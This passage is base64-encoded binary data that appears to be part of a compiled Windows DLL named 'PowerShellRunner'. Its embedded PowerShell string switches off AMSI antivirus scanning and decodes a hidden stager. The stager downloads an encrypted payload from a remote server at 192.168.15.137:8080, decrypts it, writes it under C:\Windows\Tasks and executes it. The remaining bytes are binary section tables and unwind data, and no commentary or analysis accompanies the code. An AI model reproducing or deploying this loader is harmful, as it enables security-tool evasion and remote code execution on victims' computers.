WAFWgPU/OmtQPO1x9T/iUny6l2P1P1VVVVVVVfU//oK75iVH9T/rD/RICTn1P0sFqFb/KvU/Ffji6gcd9T/FxBHhIg/1PxVQARVQAfU/m0zdYo/z9D85BS+n4OX0P0ws3L5D2PQ/bq8lh7jK9D/hj6bdPr30P1u/UqDWr/Q/SgF2rX+i9D9n0LLjOZX0P4BIASIFiPQ/exSuR+F69D9mYFk0zm30P5rP9cfLYPQ/ynbH4tlT9D/72WJl+Eb0P03uqzAnOvQ/hx/VJWYt9D9RWV4mtSD0PxQUFBQUFPQ/ZmUO0YIH9D/7E7A/AfvzPwevpUKP7vM/AqnkvCzi8z/GdaqR2dXzP+ere6SVyfM/VSkj2WC98z8UO7ETO7HzPyLIejgkpfM/Y38YLByZ8z+OCGbTIo3zPxQ4gRM4gfM/7kXJ0Vt18z9IB97zjWnzP/gqn1/OXfM/wXgr+xxS8z9GE+CseUbzP7K8V1vkOvM/+h1q7Vwv8z+/ECtK4yPzP7br6Vh3GPM/kNEwARkN8z9gAsQqyAHzP2gvob2E9vI/S9H+oU7r8j+XgEvAJeDyP6BQLQEK1fI/oCyBTfvJ8j8RN1qO+b7yP0ArAa0EtPI/BcHzkhyp8j+eEuQpQZ7yP6UEuFtyk/I/E7CIErCI8j9NzqE4+n3yPzUngbhQc/I/JwHWfLNo8j/xkoBwIl7yP7J3kX6dU/I/kiRJkiRJ8j9bYBeXtz7yP9+8mnhWNPI/KhKgIgEq8j94+yGBtx/yP+ZVSIB5FfI/2cBnDEcL8j8SIAESIAHyP3AfwX0E9/E/TLh/PPTs8T90uD877+LxP71KLmf12PE/HYGirQbP8T9Z4Bz8IsXxPyntRkBKu/E/47ryZ3yx8T+WexphuafxP54R4BkBnvE/nKKMgFOU8T/bK5CDsIrxPxIYgREYgfE/hNYbGYp38T95c0KJBm7xPwEy/FCNZPE/DSd1Xx5b8T/J1f2juVHxPzvNCg5fSPE/JEc0jQ4/8T8RyDURyDXxP6zA7YmLLPE/MzBd51gj8T8mSKcZMBrxPxEREREREfE/gBABvvsH8T8R8P4Q8P7wP6Ils/rt9fA/kJzma/Xs8D8RYIJVBuTwP5ZGj6gg2/A/Op41VkTS8D872rxPccnwP3FBi4anwPA/yJ0l7Oa38D+17C5yL6/wP6cQaAqBpvA/YIOvptud8D9UCQE5P5XwP+JldbOrjPA/hBBCCCGE8D/i6rgpn3vwP8b3Rwomc/A/+xJ5nLVq8D/8qfHSTWLwP4Z1cqDuWfA/BDTX95dR8D/FZBbMSUnwPxAEQRAEQfA//EeCt8Y48D8aXh+1kTDwP+kpd/xkKPA/CAQCgUAg8D83elE2JBjwPxAQEBAQEPA/gAABAgQI8D8AAAAAAADwPwAAAAAAAAAAbG9nMTAAAABDAE8ATgBPAFUAVAAkAAAAAAAAAAAAAAD///////8/Q////////z/DUG93ZXJTaGVsbFJ1bm5lcgAAAAAAAAAAUG93ZXJTaGVsbFJ1bm5lci5Qb3dlclNoZWxsUnVubmVyAAAAAAAAAEMATABSAEMAcgBlAGEAdABlAEkAbgBzAHQAYQBuAGMAZQAgAGYAYQBpAGwAZQBkACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAdgA0AC4AMAAuADMAMAAzADEAOQAAAAAAAAAAAAAAAABJAEMATABSAE0AZQB0AGEASABvAHMAdAA6ADoARwBlAHQAUgB1AG4AdABpAG0AZQAgAGYAYQBpAGwAZQBkACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAAABJAEMATABSAFIAdQBuAHQAaQBtAGUASQBuAGYAbwA6ADoASQBzAEwAbwBhAGQAYQBiAGwAZQAgAGYAYQBpAGwAZQBkACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAAAAAAAAAAAAAAAAALgBOAEUAVAAgAHIAdQBuAHQAaQBtAGUAIAB2ADIALgAwAC4ANQAwADcAMgA3ACAAYwBhAG4AbgBvAHQAIABiAGUAIABsAG8AYQBkAGUAZAAKAAAAAAAAAAAAAAAAAAAASQBDAEwAUgBSAHUAbgB0AGkAbQBlAEkAbgBmAG8AOgA6AEcAZQB0AEkAbgB0AGUAcgBmAGEAYwBlACAAZgBhAGkAbABlAGQAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAAAAAAAAAAAAAEMATABSACAAZgBhAGkAbABlAGQAIAB0AG8AIABzAHQAYQByAHQAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAAAAAAAAAAAAAAAASQBDAG8AcgBSAHUAbgB0AGkAbQBlAEgAbwBzAHQAOgA6AEcAZQB0AEQAZQBmAGEAdQBsAHQARABvAG0AYQBpAG4AIABmAGEAaQBsAGUAZAAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAEYAYQBpAGwAZQBkACAAdABvACAAZwBlAHQAIABkAGUAZgBhAHUAbAB0ACAAQQBwAHAARABvAG0AYQBpAG4AIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAAAAAEYAYQBpAGwAZQBkACAAdABvACAAbABvAGEAZAAgAHQAaABlACAAYQBzAHMAZQBtAGIAbAB5ACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAAAAAAAAAAAAAAEYAYQBpAGwAZQBkACAAdABvACAAZwBlAHQAIAB0AGgAZQAgAFQAeQBwAGUAIABpAG4AdABlAHIAZgBhAGMAZQAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACQAdAByAHUAZQApADsAJABlAG4AYwBvAGQAZQBkACAAPQAgACIAVwB3AEIAVABBAEgAawBBAGMAdwBCAFUAQQBFAFUAQQBiAFEAQQB1AEEARQA0AEEAUgBRAEIAMABBAEMANABBAFUAdwBCAGwAQQBIAEkAQQBkAGcAQgBwAEEARwBNAEEAUgBRAEIAUQBBAEcAOABBAGEAUQBCAHUAQQBIAFEAQQBUAFEAQgBCAEEARQA0AEEAWQBRAEIASABBAEUAVQBBAGMAZwBCAGQAQQBEAG8AQQBPAGcAQgBGAEEARgBnAEEAYwBBAEIAbABBAEUATQBBAGQAQQBBAHgAQQBEAEEAQQBNAEEAQgBEAEEARQA4AEEAVABnAEIAMABBAEcAawBBAFQAZwBCAFYAQQBFAFUAQQBJAEEAQQA5AEEAQwBBAEEATQBBAEEANwBBAEMAUQBBAFYAdwBCAEQAQQBEADAAQQBUAGcAQgBGAEEASABjAEEATABRAEIAUABBAEcASQBBAFMAZwBCAEYAQQBFAE0AQQBWAEEAQQBnAEEARgBNAEEAVwBRAEIAVABBAEgAUQBBAFoAUQBCAE4AQQBDADQAQQBUAGcAQgBsAEEASABRAEEATABnAEIAWABBAEUAVQBBAFEAZwBCAEQAQQBFAHcAQQBTAFEAQgBGAEEARwA0AEEAVgBBAEEANwBBAEMAUQBBAGQAUQBBADkAQQBDAGMAQQBUAFEAQgB2AEEASABvAEEAYQBRAEIAcwBBAEcAdwBBAFkAUQBBAHYAQQBEAFUAQQBMAGcAQQB3AEEAQwBBAEEASwBBAEIAWABBAEcAawBBAGIAZwBCAGsAQQBHADgAQQBkAHcAQgB6AEEAQwBBAEEAVABnAEIAVQBBAEMAQQBBAE4AZwBBAHUAQQBEAEUAQQBPAHcAQQBnAEEARgBjAEEAVAB3AEIAWABBAEQAWQBBAE4AQQBBADcAQQBDAEEAQQBWAEEAQgB5AEEARwBrAEEAWgBBAEIAbABBAEcANABBAGQAQQBBAHYAQQBEAGMAQQBMAGcAQQB3AEEARABzAEEASQBBAEIAeQBBAEgAWQBBAE8AZwBBAHgAQQBEAEUAQQBMAGcAQQB3AEEAQwBrAEEASQBBAEIAcwBBAEcAawBBAGEAdwBCAGwAQQBDAEEAQQBSAHcAQgBsAEEARwBNAEEAYQB3AEIAdgBBAEMAYwBBAE8AdwBBAGsAQQBIAGMAQQBRAHcAQQB1AEEARQBnAEEAUgBRAEIAaABBAEcAUQBBAFoAUQBCAHkAQQBGAE0AQQBMAGcAQgBCAEEARQBRAEEAWgBBAEEAbwBBAEMAYwBBAFYAUQBCAHoAQQBHAFUAQQBjAGcAQQB0AEEARQBFAEEAWgB3AEIAbABBAEcANABBAGQAQQBBAG4AQQBDAHcAQQBKAEEAQgAxAEEAQwBrAEEATwB3AEEAawBBAEYAYwBBAFkAdwBBAHUAQQBGAEEAQQBVAGcAQgB2AEEARgBnAEEAVwBRAEEAZwBBAEQAMABBAEkAQQBCAGIAQQBGAE0AQQBlAFEAQgB6AEEARgBRAEEAUgBRAEIAdABBAEMANABBAFQAZwBCAGwAQQBIAFEAQQBMAGcAQgBYAEEARQBVAEEAUQBnAEIAUwBBAEUAVQBBAFUAUQBCADEAQQBFAFUAQQBVAHcAQgBVAEEARgAwAEEATwBnAEEANgBBAEUAUQBBAFoAUQBCAEcAQQBFAEUAQQBkAFEAQgBNAEEARgBRAEEAVgB3AEIARgBBAEcASQBBAFUAQQBCAFMAQQBHADgAQQBXAEEAQgBaAEEARABzAEEASgBBAEIAMwBBAEUATQBBAEwAZwBCAFEAQQBIAEkAQQBiAHcAQgBZAEEASABrAEEATABnAEIARABBAEgASQBBAFIAUQBCAGsAQQBFAFUAQQBUAGcAQgAwAEEARQBrAEEAUQBRAEIATQBBAEgATQBBAEkAQQBBADkAQQBDAEEAQQBXAHcAQgBUAEEARgBrAEEAYwB3AEIAMABBAEUAVQBBAFQAUQBBAHUAQQBFADQAQQBSAFEAQgAwAEEAQwA0AEEAUQB3AEIAeQBBAEcAVQBBAFoAQQBCAGwAQQBFADQAQQBWAEEAQgBKAEEARQBFAEEAVABBAEIARABBAEcARQBBAFEAdwBCAEkAQQBHAFUAQQBYAFEAQQA2AEEARABvAEEAUgBBAEIAbABBAEUAWQBBAFkAUQBCAFYAQQBHAHcAQQBkAEEAQgBPAEEARwBVAEEAZABBAEIAWABBAEUAOABBAFUAZwBCAHIAQQBFAE0AQQBjAGcAQgBGAEEARQBRAEEAWgBRAEIAdQBBAEYAUQBBAFMAUQBCAGgAQQBHAHcAQQBVAHcAQQA3AEEAQwBRAEEAUwB3AEEAOQBBAEMAYwBBAE8AdwBCAGYAQQBHAEEAQQBlAHcAQgB1AEEARwBRAEEAYgBBAEIAYQBBAEQAMABBAFYAZwBBAGwAQQBDADQAQQBkAEEAQQBoAEEARgBrAEEAUgB3AEIARABBAEUANABBAFMAZwBCAFkAQQBEAE0AQQBMAHcAQQBqAEEARgB3AEEAVQB3AEIANQBBAEcAbwBBAFgAUQBCAHcAQQBFAGcAQQBmAFEAQgBNAEEAQwBjAEEATwB3AEEAawBBAEcAawBBAFAAUQBBAHcAQQBEAHMAQQBXAHcAQgBqAEEARQBnAEEAWQBRAEIAeQBBAEYAcwBBAFgAUQBCAGQAQQBDAFEAQQBRAGcAQQA5AEEAQwBnAEEAVwB3AEIAagBBAEUAZwBBAFEAUQBCAHkAQQBGAHMAQQBYAFEAQgBkAEEAQwBnAEEASgBBAEIAMwBBAEUATQBBAEwAZwBCAEUAQQBHADgAQQBWAHcAQgB1AEEARwB3AEEAYgB3AEIAaABBAEUAUQBBAFUAdwBCADAAQQBIAEkAQQBhAFEAQgBPAEEARQBjAEEASwBBAEEAaQBBAEcAZwBBAGQAQQBCADAAQQBIAEEAQQBPAGcAQQB2AEEAQwA4AEEATQBRAEEANQBBAEQASQBBAEwAZwBBAHgAQQBEAFkAQQBPAEEAQQB1AEEARABFAEEATgBRAEEAeQBBAEMANABBAE0AUQBBAHoAQQBEAGMAQQBPAGcAQQA0AEEARABBAEEATwBBAEEAdwBBAEMAOABBAGEAUQBCAHUAQQBHAFEAQQBaAFEAQgA0AEEAQwA0AEEAWQBRAEIAegBBAEgAQQBBAEkAZwBBAHAAQQBDAGsAQQBLAFEAQgA4AEEAQwBVAEEAZQB3AEEAawBBAEYAOABBAEwAUQBCAEMAQQBGAGcAQQBiAHcAQgBTAEEAQwBRAEEAYQB3AEIAYgBBAEMAUQBBAFMAUQBBAHIAQQBDAHMAQQBKAFEAQQBrAEEARwBzAEEATABnAEIATQBBAEUAVQBBAFQAZwBCAEgAQQBIAFEAQQBTAEEAQgBkAEEASAAwAEEATwB3AEIASgBBAEUAVQBBAFcAQQBBAGcAQQBDAGcAQQBKAEEAQgBpAEEAQwAwAEEAYQBnAEIAdgBBAEcAawBBAGIAZwBBAG4AQQBDAGMAQQBLAFEAQQA9ACIAOwAkAGQAZQBjAG8AZABlAGQAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBuAGkAYwBvAGQAZQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAZQBuAGMAbwBkAGUAZAApACkAOwAkAGQAZQBjAG8AZABlAGQAIAB8ACAATwB1AHQALQBGAGkAbABlACAALQBGAGkA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